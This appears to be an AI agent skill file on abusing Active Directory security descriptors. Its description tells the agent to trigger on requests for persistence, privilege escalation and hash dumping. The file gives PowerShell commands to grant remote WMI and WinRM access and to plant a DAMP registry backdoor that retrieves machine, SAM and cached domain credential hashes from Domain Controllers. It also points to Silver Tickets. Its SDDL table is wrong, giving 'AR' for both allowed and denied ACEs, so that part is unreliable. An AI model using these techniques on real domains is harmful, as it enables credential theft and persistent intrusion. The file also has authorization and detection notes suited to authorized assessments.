---
name: active-directory-security-descriptors
description: How to work with Active Directory security descriptors (SDDL) for penetration testing and security assessments. Use this skill whenever the user mentions security descriptors, SDDL, ACL manipulation, WMI access, WinRM access, hash dumping, DAMP, or any technique related to modifying object permissions in Active Directory. Also trigger when users want to create persistence mechanisms, escalate privileges through ACL changes, or understand how security descriptors store permissions in Windows/AD environments.
---

# Active Directory Security Descriptors

A skill for working with Security Descriptor Definition Language (SDDL) and security descriptor manipulation in Active Directory environments.

## What are Security Descriptors?

Security descriptors store the permissions an object has over another object. By making changes to security descriptors, you can obtain privileges over objects without needing to be a member of privileged groups.

**SDDL Format:**
```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;
```

## When to Use This Skill

Use this skill when you need to:
- Understand or modify SDDL strings
- Grant WMI access to users
- Configure WinRM/PowerShell Remoting access
- Create registry backdoors for hash dumping
- Analyze or manipulate ACLs for privilege escalation
- Create persistence mechanisms through security descriptor changes

## WMI Access

Grant a user remote WMI execution access:

```powershell
# Grant WMI access
Set-RemoteWMI -UserName <username> -ComputerName <hostname> -namespace 'root\cimv2' -Verbose

# Remove WMI access
Set-RemoteWMI -UserName <username> -ComputerName <hostname> -namespace 'root\cimv2' -Remove -Verbose
```

**Use case:** Allows remote WMI execution for lateral movement or persistence.

## WinRM/PowerShell Remoting Access

Grant a user WinRM PowerShell console access:

```powershell
# Grant WinRM access
Set-RemotePSRemoting -UserName <username> -ComputerName <hostname> -Verbose

# Remove WinRM access
Set-RemotePSRemoting -UserName <username> -ComputerName <hostname> -Remove -Verbose
```

**Use case:** Enables remote PowerShell sessions for command execution.

## Registry Backdoor for Hash Dumping (DAMP)

Create a registry backdoor to remotely retrieve hashes and credentials:

```powershell
# Create registry backdoor
Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose

# Retrieve machine account hash
Get-RemoteMachineAccountHash -ComputerName <hostname> -Verbose

# Retrieve SAM account hashes
Get-RemoteLocalAccountHash -ComputerName <hostname> -Verbose

# Retrieve cached domain credentials
Get-RemoteCachedCredential -ComputerName <hostname> -Verbose
```

**Use case:** Very useful for granting regular users the ability to dump hashes from Domain Controllers without admin privileges.

## Important Considerations

1. **Domain Controller Targeting:** Registry backdoors are especially valuable when applied to Domain Controllers, as they provide access to cached AD credentials.

2. **Silver Tickets:** The machine account hash from a Domain Controller can be used to create Silver Tickets. See related documentation on Silver Tickets for more information.

3. **Persistence:** Security descriptor modifications provide persistence that survives reboots and doesn't require scheduled tasks or services.

4. **Detection:** These techniques may be detected by:
   - ACL change monitoring
   - WMI/WinRM access logging
   - Registry access monitoring
   - DAMP tool signatures

## Common SDDL Components

| Component | Description |
|-----------|-------------|
| `ace_type` | Type of ACE (e.g., `AR` for Access Allowed, `AR` for Access Denied) |
| `ace_flags` | Flags like `OI` (Object Inherit), `CI` (Container Inherit) |
| `rights` | Specific rights (e.g., `GA` for Generic All, `RC` for Read Control) |
| `object_guid` | GUID of the object being accessed |
| `account_sid` | SID of the account being granted/denied access |

## Example Workflow

1. **Identify target object** (e.g., Domain Controller, specific AD object)
2. **Determine needed access** (WMI, WinRM, registry, etc.)
3. **Apply security descriptor change** using appropriate tool
4. **Verify access** by testing the granted permissions
5. **Document changes** for cleanup or reporting

## Tools Reference

- **Nishang:** PowerShell scripts for WMI and WinRM access
- **DAMP:** Tool for registry backdoor creation and hash retrieval
- **PowerView:** For enumerating and understanding current ACLs

## Safety Notes

- Always have proper authorization before modifying security descriptors
- Document all changes for cleanup
- Test in non-production environments first
- Understand the impact of permission changes on system security
